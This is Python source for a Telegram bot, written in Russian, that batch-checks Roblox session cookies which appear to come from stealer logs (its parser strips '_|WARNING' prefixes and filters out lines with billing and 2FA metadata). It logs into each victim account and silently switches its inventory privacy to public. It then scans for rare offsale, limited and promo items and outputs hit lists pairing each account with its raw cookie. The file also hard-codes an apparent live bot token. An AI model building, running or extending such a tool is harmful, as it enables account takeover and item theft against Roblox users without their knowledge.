import asyncio
import io
import re
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions,
    BufferedInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ========== НАСТРОЙКИ ==========
BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
ADMIN_IDS = {5883796026, 115536598}

YEAR_FROM   = 2012
YEAR_TO     = 2024
CHECK_PROMO = True

ASSET_TYPES = {
    "faces":    True,
    "hats":     True,
    "hair":     True,
    "neck":     True,
    "shoulder": True,
    "front":    True,
    "back":     True,
    "waist":    True,
    "gear":     True,
    "clothing": False,
}
# ================================

ASSET_TYPE_STRINGS = {
    "faces":    ["Face"],
    "hats":     ["Hat"],
    "hair":     ["HairAccessory"],
    "neck":     ["FaceAccessory"],
    "shoulder": ["ShoulderAccessory"],
    "front":    ["FrontAccessory"],
    "back":     ["BackAccessory"],
    "waist":    ["WaistAccessory"],
    "gear":     ["Gear"],
    "clothing": ["Shirt", "Pants"],
}

ASSET_LABELS = {
    "faces":    "👤 Лица",
    "hats":     "🎩 Шапки",
    "hair":     "💇 Волосы",
    "neck":     "📿 Шея",
    "shoulder": "🦴 Плечи",
    "front":    "🧣 Передние",
    "back":     "🎒 Задние",
    "waist":    "🩱 Пояс",
    "gear":     "⚔️ Снаряжение",
    "clothing": "👕 Одежда",
}

CODE_ITEMS = {
    189934238:  "Fireman",
    4342314393: "Rainbow Squid Unicorn",
    263405835:  "Chicken Headrow",
    263405839:  "Black Iron Tentacles",
    263405842:  "Code Review Specs",
    263405844:  "Stickpack",
    263405846:  "Shark Fin",
    263405849:  "Federation Necklace",
    263405851:  "Backup Mr. Robot",
    263405853:  "Dark Lord of SQL",
    263405855:  "Roblox visor 1",
    263405857:  "Silver Bow Tie",
    263405859:  "Dodgeball Helmet",
    263405861:  "Shoulder Raccoon",
    263405863:  "Dued1",
    263405865:  "Pauldrons",
    263405867:  "Octember Encore",
    263405869:  "Umberhorns",
    128540404:  "Police Cap",
    128540406:  "American Baseball Cap",
    128540408:  "Orange Cap",
    218491492:  "Navy Queen otn",
    128540410:  "Zombie Knit",
    128540412:  "Epic Miners Headlamp",
    128540414:  "Beast Mode Bandana",
    162295698:  "Golden Reingment",
    128540416:  "Beast Scythe",
    128540418:  "Hare Hoodie",
    128540420:  "Diamond Tiara",
    128540422:  "Callmehbob",
    128540424:  "Sword Cane",
    128540426:  "Selfie Stick",
    128540428:  "Phantom Forces Combat Knife",
    128540430:  "Golden Horns",
    128540432:  "The Soup is Dry",
    128540434:  "Monster Grumpy Face",
    128540436:  "Elegant Evening Face",
    128540438:  "Super Pink Make-Up",
    128540440:  "Cyanskeleface",
    128540442:  "Pizza Face",
    128540444:  "Bakonetta",
    128540446:  "Isabella",
    128540448:  "Mon Cheri",
    128540450:  "Rogueish Good Looks",
    128540452:  "Mixologist's Smile",
    128540454:  "BiteyMcFace",
    128540456:  "Performing Mime",
    128540458:  "Rainbow Spirit Face",
    128540460:  "Mermaid Mystique",
    128540462:  "Starry Eyes Sparkling",
    128540464:  "Sparkling Friendly Wink",
    128540466:  "Kandi's Sprinkle Face",
    128540468:  "Tears of Sorrow",
    128540470:  "Fashion Face",
    128540472:  "Princess Alexis",
    128540474:  "Otakufaic",
    128540476:  "Pop Queen",
    128540478:  "Assassin Face",
    128540480:  "Sapphire Gaze",
    128540482:  "Persephone's E-Girl",
    128540484:  "Arachnid Queen",
    128540486:  "Rainbow Barf Face",
    128540488:  "Star Sorority",
    128540490:  "Tsundere Face",
    128540492:  "Winning Smile",
}

# ================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher(storage=MemoryStorage())

settings = {
    "year_from":   YEAR_FROM,
    "year_to":     YEAR_TO,
    "check_promo": CHECK_PROMO,
    "asset_types": dict(ASSET_TYPES),
}

class SetYear(StatesGroup):
    from_year = State()
    to_year   = State()

class SearchState(StatesGroup):
    waiting_for_term   = State()
    waiting_for_cookie = State()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

# Семафор — не более 5 одновременных проверок
CHECK_SEM = asyncio.Semaphore(5)


# ================================================================
#  COOKIE PARSING
# ================================================================

def _parse_cookie(raw):
    """Извлекает чистый кук из строки любого формата."""
    c = raw.strip()
    # Формат: "... | Cookie: VALUE"
    if "Cookie: " in c:
        c = c.split("Cookie: ")[-1].strip()
    # Новый WARNING формат: _|WARNING:-...|_COOKIE
    if c.startswith("_|WARNING") and "|_" in c:
        c = c.split("|_", 1)[-1].strip()
    # Старый WARNING формат: _|WARNING:-...--|COOKIE
    elif "_|WARNING" in c and "--|" in c:
        c = c.split("--|", 1)[-1].strip()
    # Убираем префикс если есть
    for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
        if c.lower().startswith(p.lower()):
            c = c[len(p):]
    return c.strip()


def _is_cookie(val):
    """Проверяет что строка является настоящим куком Roblox."""
    if len(val) < 50:
        return False
    # Куки не содержат пробелов
    if " " in val:
        return False
    # Слова из метаданных — точно не кук
    meta_words = [
        "Username", "Cookie:", "WARNING", "Birthdate", "Country",
        "Robux", "Email", "Playtime", "Gamepass", "Badge", "Sessions",
        "Followers", "roblox.com", "http", "Pending", "Billing",
        "Donated", "AllTime", "Voice", "Visits", "Groups", "Prem",
        "Rare", "Card", "2FA", "RAP", "Total", "Created", "LastOnline"
    ]
    for w in meta_words:
        if w in val:
            return False
    # Допустимые символы в кукe Roblox (base64url + точка)
    if not re.match(r'^[A-Za-z0-9\-_=+/.%]+$', val):
        return False
    # Минимальная длина настоящего кука — 100 символов
    if len(val) < 50:
        return False
    return True


def extract_cookies(text):
    """Извлекает все уникальные куки из текста любого формата."""
    cookies = []
    seen    = set()

    for line in re.split(r'\r?\n', text):
        line = line.strip()
        if not line:
            continue
        # Строки с меткой Cookie:
        if "Cookie: " in line:
            val = _parse_cookie(line)
            if _is_cookie(val) and val not in seen:
                seen.add(val)
                cookies.append(val)
        else:
            # Голая строка — пробуем как кук
            val = _parse_cookie(line)
            if _is_cookie(val) and val not in seen:
                seen.add(val)
                cookies.append(val)

    return cookies


def clean_cookie(raw):
    return _parse_cookie(raw)


# ================================================================
#  ROBLOX API — одна сессия на аккаунт
# ================================================================

def make_session(cookie):
    """
    Создаёт одну постоянную сессию для всех запросов к одному аккаунту.
    Кук передаётся как заголовок — надёжнее чем CookieJar.
    """
    return aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=10),
        timeout=aiohttp.ClientTimeout(total=30),
        headers={
            "Cookie":          ".ROBLOSECURITY=" + cookie,
            "User-Agent":      UA,
            "Accept":          "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer":         "https://www.roblox.com/",
            "Origin":          "https://www.roblox.com",
        }
    )


async def api_get(session, url, params=None, retries=3):
    """GET запрос с повторными попытками при ошибках сети."""
    for attempt in range(retries):
        try:
            async with session.get(url, params=params) as r:
                if r.status == 200:
                    return await r.json(content_type=None)
                if r.status in (401, 403):
                    return None  # нет доступа — не повторяем
                if r.status == 429:  # rate limit
                    await asyncio.sleep(5)
                    continue
                return None
        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt < retries - 1:
                await asyncio.sleep(1 + attempt)
    return None


async def api_post(session, url, json_data=None, extra_headers=None, retries=3):
    """POST запрос с повторными попытками."""
    headers = dict(extra_headers) if extra_headers else {}
    for attempt in range(retries):
        try:
            async with session.post(url, json=json_data, headers=headers) as r:
                token = r.headers.get("x-csrf-token")
                return r.status, token, await r.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt < retries - 1:
                await asyncio.sleep(1 + attempt)
    return None, None, None


async def api_patch(session, url, json_data=None, extra_headers=None, retries=3):
    """PATCH запрос с повторными попытками."""
    headers = dict(extra_headers) if extra_headers else {}
    for attempt in range(retries):
        try:
            async with session.patch(url, json=json_data, headers=headers) as r:
                return r.status, await r.text()
        except (aiohttp.ClientError, asyncio.TimeoutError):
            if attempt < retries - 1:
                await asyncio.sleep(1 + attempt)
    return None, None


# ================================================================
#  ROBLOX БИЗНЕС-ЛОГИКА
# ================================================================

async def auth(session):
    """Проверяет авторизацию. Возвращает {id, name} или None."""
    data = await api_get(session, "https://users.roblox.com/v1/users/authenticated")
    if data and data.get("id"):
        return {"id": int(data["id"]), "name": data.get("displayName") or data.get("name") or "?"}
    # Запасной эндпоинт
    data = await api_get(session, "https://www.roblox.com/mobileapi/userinfo")
    if data and data.get("UserID"):
        return {"id": int(data["UserID"]), "name": data.get("UserName") or "?"}
    return None


async def get_csrf(session):
    """Получает CSRF токен."""
    _, token, _ = await api_post(session, "https://auth.roblox.com/v2/logout")
    if token:
        return token
    _, token, _ = await api_post(session, "https://accountsettings.roblox.com/v1/email")
    return token


async def open_inventory(session):
    """Открывает инвентарь для всех через ту же сессию (с куком)."""
    # Получаем CSRF через ту же сессию
    csrf = None
    for url in ["https://auth.roblox.com/v2/logout",
                "https://accountsettings.roblox.com/v1/email"]:
        try:
            async with session.post(url) as r:
                token = r.headers.get("x-csrf-token")
                if token:
                    csrf = token
                    break
        except Exception:
            pass

    if not csrf:
        return False

    hdrs = {"x-csrf-token": csrf, "Content-Type": "application/json"}

    for method_name, url, body in [
        ("patch", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",
                  {"inventoryPrivacy": 1}),
        ("post",  "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",
                  {"inventoryPrivacy": 1}),
        ("patch", "https://accountsettings.roblox.com/v1/privacy",
                  {"InventoryPrivacySetting": "AllUsers"}),
        ("post",  "https://accountsettings.roblox.com/v1/privacy",
                  {"InventoryPrivacySetting": "AllUsers"}),
    ]:
        try:
            fn = session.patch if method_name == "patch" else session.post
            async with fn(url, json=body, headers=hdrs) as r:
                if r.status in (200, 204):
                    return True
        except Exception:
            pass

    return False


async def load_inventory_type(session, user_id, type_str):
    """Загружает все предметы одного типа из инвентаря."""
    ids    = []
    cursor = ""
    url    = "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id)

    while True:
        params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
        if cursor:
            params["cursor"] = cursor

        data = await api_get(session, url, params=params)
        if data is None:
            break

        for item in data.get("data", []):
            aid = item.get("assetId") or item.get("id")
            if aid:
                ids.append(int(aid))

        cursor = data.get("nextPageCursor") or ""
        if not cursor:
            break
        await asyncio.sleep(0.2)

    return ids


async def load_all_inventory(session, user_id):
    """
    Загружает весь инвентарь через одну сессию.
    Шаг 1: пробует загрузить.
    Шаг 2: если 403 или пусто — открывает инвентарь и грузит заново.
    Возвращает sorted list (стабильный порядок).
    """
    type_strings = []
    for key, on in settings["asset_types"].items():
        if on:
            type_strings.extend(ASSET_TYPE_STRINGS[key])

    async def fetch_all_types():
        """Грузит все типы, возвращает (ids_set, got_403)."""
        ids     = set()
        got_403 = False
        url     = "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id)

        for type_str in type_strings:
            cursor = ""
            while True:
                params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
                if cursor:
                    params["cursor"] = cursor
                try:
                    async with session.get(url, params=params) as r:
                        if r.status == 403:
                            got_403 = True
                            break
                        if r.status != 200:
                            break
                        data = await r.json(content_type=None)
                        for item in data.get("data", []):
                            aid = item.get("assetId") or item.get("id")
                            if aid:
                                ids.add(int(aid))
                        cursor = data.get("nextPageCursor") or ""
                        if not cursor:
                            break
                except Exception:
                    break
                await asyncio.sleep(0.2)

        return ids, got_403

    # Первая попытка
    all_ids, got_403 = await fetch_all_types()

    # Если закрыт или пусто — открываем и повторяем
    if got_403 or not all_ids:
        opened = await open_inventory(session)
        if opened:
            await asyncio.sleep(2.5)   # ждём пока Roblox применит настройку
            all_ids, _ = await fetch_all_types()

    return sorted(all_ids)   # сортировка = одинаковый порядок при повторах

async def get_asset_details(session, asset_id):
    """Детали одного предмета через economy API (fallback)."""
    return await api_get(
        session,
        "https://economy.roblox.com/v2/assets/{}/details".format(asset_id)
    )


async def get_catalog_batch(asset_ids):
    """
    Батч-запрос к catalog API — до 120 предметов за раз.
    Не требует авторизации. Возвращает {asset_id: item_dict}.
    """
    result = {}
    # Catalog API не требует кук — используем чистую сессию
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=30),
        headers={"User-Agent": UA, "Accept": "application/json",
                 "Content-Type": "application/json"}
    ) as s:
        for i in range(0, len(asset_ids), 120):
            chunk   = asset_ids[i:i + 120]
            payload = {"items": [{"itemType": "Asset", "id": aid} for aid in chunk]}
            for attempt in range(3):
                try:
                    async with s.post(
                        "https://catalog.roblox.com/v1/catalog/items/details",
                        json=payload
                    ) as r:
                        if r.status == 200:
                            data = await r.json(content_type=None)
                            for item in data.get("data", []):
                                aid = item.get("id")
                                if aid:
                                    result[int(aid)] = item
                            break
                        elif r.status == 429:
                            await asyncio.sleep(3)
                        else:
                            break
                except Exception:
                    if attempt < 2:
                        await asyncio.sleep(1)
            await asyncio.sleep(0.3)
    return result


def catalog_is_offsale(item):
    """Определяет оффсейл по ответу catalog API."""
    ps = item.get("priceStatus") or ""
    if ps == "Off Sale":
        return True
    if ps == "No Price" and item.get("price") is None:
        return True
    return False


def catalog_get_year(item):
    """Год создания из catalog API."""
    for field in ("createdUtc", "created"):
        val = item.get(field)
        if val:
            try:
                return datetime.fromisoformat(str(val).replace("Z", "+00:00")).year
            except Exception:
                pass
    return 0


async def owns_item(session, user_id, asset_id):
    """Проверяет владение предметом."""
    data = await api_get(
        session,
        "https://inventory.roblox.com/v1/users/{}/items/Asset/{}".format(user_id, asset_id)
    )
    return bool(data and data.get("data"))


# ================================================================
#  ОСНОВНАЯ ПРОВЕРКА АККАУНТА
# ================================================================

async def check_account(cookie, on_status, mode="offsale", search_term=None):
    """
    Проверяет один аккаунт используя ОДНУ сессию на всё.
    on_status(text) — коллбэк для обновления статуса.
    mode: "offsale" | "search"
    """
    result = {
        "valid":          False,
        "user_id":        None,
        "username":       None,
        "offsale":        [],
        "promo_found":    [],
        "inv_total":      0,
        "search_results": [],
    }

    async with make_session(cookie) as session:

        # 1. Авторизация
        user_info = await auth(session)
        if not user_info:
            return result

        result["valid"]    = True
        result["user_id"]  = user_info["id"]
        result["username"] = user_info["name"]
        uid   = user_info["id"]
        uname = user_info["name"]

        # 2. Загружаем инвентарь (открывает автоматически если 403)
        await on_status("✅ <b>{}</b>\n📦 Загружаю инвентарь...".format(uname))
        all_ids = await load_all_inventory(session, uid)
        result["inv_total"] = len(all_ids)

        if not all_ids:
            return result

        # ── РЕЖИМ ПОИСКА ──────────────────────────────────────────
        if mode == "search" and search_term:
            term_lower = search_term.lower()
            total = len(all_ids)
            await on_status("✅ <b>{}</b>\n🔍 Ищу «{}» в {} предм...".format(
                uname, search_term, total))

            # Батч-запрос: получаем данные сразу по 120 предметов
            catalog = await get_catalog_batch(all_ids)
            for asset_id, item in catalog.items():
                name = item.get("name") or item.get("Name") or ""
                if term_lower in name.lower():
                    year = catalog_get_year(item)
                    result["search_results"].append(
                        {"id": asset_id, "name": name, "year": year}
                    )
            return result

        # ── РЕЖИМ ОФФСЕЙЛ ─────────────────────────────────────────

        # Промо-предметы
        if settings["check_promo"]:
            promo_keys = list(CODE_ITEMS.keys())
            total_p    = len(promo_keys)
            await on_status("✅ <b>{}</b>\n🎁 Промо 0/{}...".format(uname, total_p))
            for i, asset_id in enumerate(promo_keys):
                if i % 10 == 0:
                    await on_status("✅ <b>{}</b>\n🎁 Промо {}/{}...".format(
                        uname, i, total_p))
                if await owns_item(session, uid, asset_id):
                    result["promo_found"].append(
                        {"id": asset_id, "name": CODE_ITEMS[asset_id]}
                    )
                await asyncio.sleep(0.15)

        # Оффсейл предметы — батч через catalog API (120 за раз, намного быстрее)
        total = len(all_ids)
        await on_status("✅ <b>{}</b>\n🔍 Проверяю {} предметов (батч)...".format(uname, total))

        catalog = await get_catalog_batch(all_ids)

        for asset_id, item in catalog.items():
            if not catalog_is_offsale(item):
                continue

            year = catalog_get_year(item)
            if year and not (settings["year_from"] <= year <= settings["year_to"]):
                continue

            restrictions = item.get("itemRestrictions") or []
            is_unique    = "LimitedUnique" in restrictions
            is_limited   = "Limited" in restrictions or is_unique
            name         = item.get("name") or item.get("Name") or "ID:{}".format(asset_id)

            result["offsale"].append({
                "id":      int(asset_id),
                "name":    name,
                "year":    year,
                "limited": is_limited,
                "unique":  is_unique,
            })

        # Для предметов которых нет в catalog — fallback через economy API
        missing = [aid for aid in all_ids if aid not in catalog]
        if missing:
            await on_status("✅ <b>{}</b>\n🔍 Проверяю {} предметов (fallback)...".format(
                uname, len(missing)))
            for asset_id in missing:
                det = await get_asset_details(session, asset_id)
                if not det or det.get("IsForSale", True):
                    await asyncio.sleep(0.05)
                    continue
                year = 0
                try:
                    dt   = datetime.fromisoformat(
                        det.get("Created", "").replace("Z", "+00:00"))
                    year = dt.year
                except Exception:
                    pass
                if year and not (settings["year_from"] <= year <= settings["year_to"]):
                    await asyncio.sleep(0.05)
                    continue
                is_unique  = det.get("IsLimitedUnique", False)
                is_limited = det.get("IsLimited", False) or is_unique
                name       = det.get("Name") or "ID:{}".format(asset_id)
                result["offsale"].append({
                    "id": asset_id, "name": name, "year": year,
                    "limited": is_limited, "unique": is_unique,
                })
                await asyncio.sleep(0.05)

    return result


# ================================================================
#  SILENT CHECK (для батча — без обновления статуса)
# ================================================================

async def silent_check(cookie, mode="offsale", search_term=None):
    """
    Проверяет аккаунт с повторами при неудаче.
    Повторяет до 3 раз если инвентарь пустой или ошибка сети.
    """
    async def noop(text):
        pass

    empty = {
        "valid": False, "user_id": None, "username": None,
        "offsale": [], "promo_found": [], "inv_total": 0, "search_results": [],
    }

    last_result = empty
    for attempt in range(1, 4):   # 3 попытки
        try:
            r = await check_account(cookie, noop, mode=mode, search_term=search_term)
        except Exception:
            await asyncio.sleep(2 * attempt)
            continue

        if not r["valid"]:
            # Невалидный кук — нет смысла повторять
            return r

        # Если инвентарь загрузился — возвращаем
        if r["inv_total"] > 0:
            return r

        # Инвентарь пустой — ждём и повторяем
        last_result = r
        if attempt < 3:
            await asyncio.sleep(3 * attempt)

    return last_result


# ================================================================
#  ОТЧЁТ
# ================================================================

def build_report(result):
    uid, uname = result["user_id"], result["username"]
    offsale    = result["offsale"]
    promo      = result["promo_found"]
    lines = [
        "📋 <b>Отчёт проверки</b>",
        '👤 <a href="https://www.roblox.com/users/{}/profile">{}</a>  (ID: {})'.format(
            uid, uname, uid),
        "📅 Период: <b>{} – {}</b>".format(settings["year_from"], settings["year_to"]),
        "📦 Предметов в инвентаре: <b>{}</b>".format(result.get("inv_total", 0)),
        "",
    ]
    if offsale:
        lines.append("🛑 <b>Оффсейл — {} шт.:</b>".format(len(offsale)))
        by_year = {}
        for it in sorted(offsale, key=lambda x: x["year"] or 9999):
            by_year.setdefault(it["year"] or 0, []).append(it)
        for year in sorted(by_year):
            lines.append("\n  📆 <b>{}:</b>".format(year or "Год неизвестен"))
            for it in by_year[year]:
                badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
                lines.append(
                    '    • <a href="https://www.roblox.com/catalog/{}">{}</a>{}'.format(
                        it["id"], it["name"], badge))
    else:
        lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
    lines.append("")
    if settings["check_promo"]:
        if promo:
            lines.append("🎁 <b>Промо — {} шт.:</b>".format(len(promo)))
            for it in promo:
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>'.format(
                    it["id"], it["name"]))
        else:
            lines.append("🎁 Промо-предметов <b>не найдено</b>")
    return "\n".join(lines)


# ================================================================
#  ОДИНОЧНАЯ ПРОВЕРКА
# ================================================================

async def run_check(message, cookie):
    cookie = clean_cookie(cookie)
    if not _is_cookie(cookie):
        await message.answer("❌ Не похоже на кук Roblox ({} симв.)".format(len(cookie)))
        return

    status_msg = await message.answer("⏳ <b>Авторизация...</b>")

    async def upd(text):
        try:
            await status_msg.edit_text(text)
        except Exception:
            pass

    async with CHECK_SEM:
        try:
            result = await check_account(cookie, upd)
        except Exception as e:
            await status_msg.edit_text("❌ Ошибка:\n<code>{}</code>".format(e))
            return

    if not result["valid"]:
        await status_msg.edit_text("❌ <b>Невалидный cookie</b>")
        return

    report = build_report(result)
    if len(report) > 3800:
        await status_msg.delete()
        f = BufferedInputFile(
            report.encode("utf-8"),
            filename="report_{}.txt".format(result["user_id"])
        )
        await message.answer_document(f, caption="📋 {}".format(result["username"]))
    else:
        await status_msg.edit_text(
            report,
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )


# ================================================================
#  БАТЧ ПРОВЕРКА
# ================================================================

async def run_batch(message, cookies):
    total    = len(cookies)
    results  = [None] * total
    counter  = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes    = 0

    prog = await message.answer("⏳ Проверяю 0/{} ...".format(total))

    # Последовательная проверка — надёжнее параллельной
    # Не мешают друг другу, каждый аккаунт получает полный ресурс
    for i, c in enumerate(cookies):
        r = await silent_check(c)
        results[i] = (r, c)
        counter["done"] += 1
        if r["valid"]:
            counter["valid"] += 1
            uid = r["user_id"]
            if uid in seen_ids:
                dupes += 1
            else:
                seen_ids[uid] = i
        else:
            counter["invalid"] += 1
        try:
            await prog.edit_text("⏳ {}/{}  ✅{}  ❌{}".format(
                counter["done"], total,
                counter["valid"], counter["invalid"]))
        except Exception:
            pass
        await asyncio.sleep(0.5)   # пауза между аккаунтами
    try:
        await prog.delete()
    except Exception:
        pass

    valid_pairs = [
        (r, c) for r, c in results
        if r and r["valid"] and r["user_id"] in seen_ids
    ]
    hits = [(r, c) for r, c in valid_pairs if r["offsale"] or r["promo_found"]]

    await message.answer(
        "📊 <b>Итоги проверки</b>\n\n"
        "🔢 Всего: <b>{}</b>\n"
        "✅ Валидных: <b>{}</b>\n"
        "❌ Невалидных: <b>{}</b>\n"
        "👥 Дубликатов: <b>{}</b>\n\n"
        "🛑 Акков с оффсейл: <b>{}</b>\n"
        "🎁 Акков с промо: <b>{}</b>".format(
            total, counter["valid"], counter["invalid"], dupes,
            sum(1 for r, _ in valid_pairs if r["offsale"]),
            sum(1 for r, _ in valid_pairs if r["promo_found"]),
        )
    )

    if hits:
        lines = ["АККАУНТЫ С НАХОДКАМИ", "=" * 60, ""]
        for r, c in hits:
            uid, uname = r["user_id"], r["username"]
            lines += [
                "=" * 60,
                "Аккаунт: {} (ID: {})".format(uname, uid),
                "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                "Куки: {}".format(c), "",
            ]
            if r["offsale"]:
                lines.append("ОФФСЕЙЛ ({} шт.):".format(len(r["offsale"])))
                for it in sorted(r["offsale"], key=lambda x: x["year"] or 9999):
                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
                    lines.append("  {} ({}) — https://www.roblox.com/catalog/{}{}".format(
                        it["name"], it["year"] or "?", it["id"], badge))
            else:
                lines.append("Оффсейл: нет")
            lines.append("")
            if r["promo_found"]:
                lines.append("ПРОМО ({} шт.):".format(len(r["promo_found"])))
                for it in r["promo_found"]:
                    lines.append("  {} — https://www.roblox.com/catalog/{}".format(
                        it["name"], it["id"]))
            else:
                lines.append("Промо: нет")
            lines.append("")

        f = BufferedInputFile(
            "\n".join(lines).encode("utf-8"),
            filename="hits_{}_accs.txt".format(len(hits))
        )
        await message.answer_document(
            f, caption="🎯 {} акков с находками из {}".format(len(hits), total)
        )
    else:
        await message.answer("😔 Ни на одном аккаунте ничего не найдено.")


# ================================================================
#  БАТЧ ПОИСК
# ================================================================

async def run_batch_search(message, cookies, term):
    total    = len(cookies)
    results  = [None] * total
    counter  = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes    = 0
    start    = datetime.now()

    prog = await message.answer(
        "🔍 «{}» — 0/{} ...".format(term, total)
    )

    # Последовательная проверка — каждый аккаунт проверяется полностью
    for i, cookie in enumerate(cookies):
        r = await silent_check(cookie, mode="search", search_term=term)
        results[i] = (r, cookie)
        counter["done"] += 1
        if r["valid"]:
            counter["valid"] += 1
            uid = r["user_id"]
            if uid in seen_ids:
                dupes += 1
            else:
                seen_ids[uid] = i
        else:
            counter["invalid"] += 1
        found_now = sum(
            len(x[0]["search_results"]) for x in results
            if x and x[0] and x[0].get("search_results")
        )
        elapsed = (datetime.now() - start).total_seconds()
        speed   = counter["done"] / elapsed if elapsed > 0 else 0
        try:
            await prog.edit_text(
                "🔍 «{}» — {}/{}  ✅{}  ❌{}  🎯{}  {:.1f}/с".format(
                    term, counter["done"], total,
                    counter["valid"], counter["invalid"],
                    found_now, speed)
            )
        except Exception:
            pass
        await asyncio.sleep(0.5)
    try:
        await prog.delete()
    except Exception:
        pass

    valid_pairs = [
        (r, c) for r, c in results
        if r and r["valid"] and r["user_id"] in seen_ids
    ]
    hits        = [(r, c) for r, c in valid_pairs if r.get("search_results")]
    total_found = sum(len(r["search_results"]) for r, _ in hits)
    elapsed     = (datetime.now() - start).total_seconds()

    await message.answer(
        "✅ <b>Поиск завершён</b>\n\n"
        "🔍 Запрос: «<b>{}</b>»\n"
        "⏱ Время: {:.1f} с\n\n"
        "🔢 Всего: <b>{}</b>  ✅<b>{}</b>  ❌<b>{}</b>  👥<b>{}</b>\n\n"
        "🎯 Акков с находками: <b>{}</b>\n"
        "📦 Всего предметов: <b>{}</b>".format(
            term, elapsed,
            total, counter["valid"], counter["invalid"], dupes,
            len(hits), total_found
        ),
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    if hits:
        lines = [
            "ПОИСК: «{}»".format(term),
            "=" * 60,
            "Всего: {} | Валид: {} | Невалид: {} | Дубли: {}".format(
                total, counter["valid"], counter["invalid"], dupes),
            "Акков с находками: {} | Предметов: {}  Время: {:.1f}с".format(
                len(hits), total_found, elapsed),
            "",
        ]
        for r, cookie in hits:
            uid, uname = r["user_id"], r["username"]
            lines += [
                "=" * 60,
                "Аккаунт: {} (ID: {})".format(uname, uid),
                "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                "Куки: {}".format(cookie), "",
                "Найдено «{}» ({} шт.):".format(term, len(r["search_results"])),
            ]
            for it in r["search_results"]:
                lines.append("  • {} ({}) — https://www.roblox.com/catalog/{}".format(
                    it["name"], it["year"] or "?", it["id"]))
            lines.append("")

        f = BufferedInputFile(
            "\n".join(lines).encode("utf-8"),
            filename="search_{}.txt".format(term.replace(" ", "_"))
        )
        await message.answer_document(
            f, caption="🔍 «{}» на {} акках ({} шт.)".format(term, len(hits), total_found)
        )
    else:
        await message.answer("❌ «{}» не найдено ни на одном аккаунте.".format(term))


# ================================================================
#  ЕДИНАЯ ТОЧКА ЗАПУСКА ПОИСКА
# ================================================================

async def do_search(message, cookies, term):
    if not cookies:
        await message.answer("❌ Не найдено куков.")
        return
    await message.answer(
        "🔍 <b>{}</b> куков. Ищу «{}»...".format(len(cookies), term)
    )
    if len(cookies) == 1:
        status_msg = await message.answer("⏳ Авторизация...")
        async def upd(text):
            try: await status_msg.edit_text(text)
            except Exception: pass
        async with CHECK_SEM:
            r = await check_account(cookies[0], upd, mode="search", search_term=term)
        if not r["valid"]:
            await status_msg.edit_text("❌ Невалидный cookie")
            return
        found = r["search_results"]
        if found:
            lines = ["🔍 <b>«{}»</b> на <b>{}</b>:\n".format(term, r["username"])]
            for it in found:
                lines.append(
                    '• <a href="https://www.roblox.com/catalog/{}">{}</a> ({})'.format(
                        it["id"], it["name"], it["year"] or "?"))
            await status_msg.edit_text(
                "\n".join(lines),
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        else:
            await status_msg.edit_text(
                "❌ На аккаунте {} не найдено «{}».".format(r["username"], term)
            )
    else:
        await run_batch_search(message, cookies, term)


# ================================================================
#  КЛАВИАТУРА НАСТРОЕК
# ================================================================

def settings_kb():
    rows = []
    for key, label in ASSET_LABELS.items():
        icon = "✅" if settings["asset_types"][key] else "❌"
        rows.append([InlineKeyboardButton(
            text="{} {}".format(icon, label),
            callback_data="tog_{}".format(key)
        )])
    pi = "✅" if settings["check_promo"] else "❌"
    rows.append([InlineKeyboardButton(
        text="{} 🎁 Промо".format(pi), callback_data="tog_promo"
    )])
    rows.append([
        InlineKeyboardButton(
            text="📅 С {}".format(settings["year_from"]), callback_data="set_yf"),
        InlineKeyboardButton(
            text="📅 По {}".format(settings["year_to"]),  callback_data="set_yt"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_admin(obj):
    return obj.from_user.id in ADMIN_IDS


# ================================================================
#  ХЕНДЛЕРЫ
# ================================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message): return
    await message.answer(
        "🎮 <b>Roblox Offsale Checker</b>\n\n"
        "Отправь cookie текстом или .txt файлом\n\n"
        "⚙️ /settings — настройки\n"
        "ℹ️ /info — текущие настройки\n"
        "🔍 /search [название] — поиск предмета"
    )


@dp.message(Command("info"))
async def cmd_info(message: Message):
    if not is_admin(message): return
    types_on = [ASSET_LABELS[k] for k, v in settings["asset_types"].items() if v]
    await message.answer(
        "ℹ️ <b>Настройки</b>\n"
        "📅 {}-{}\n"
        "🎁 Промо: {}\n"
        "📦 {}".format(
            settings["year_from"], settings["year_to"],
            "✅" if settings["check_promo"] else "❌",
            ", ".join(types_on)
        )
    )


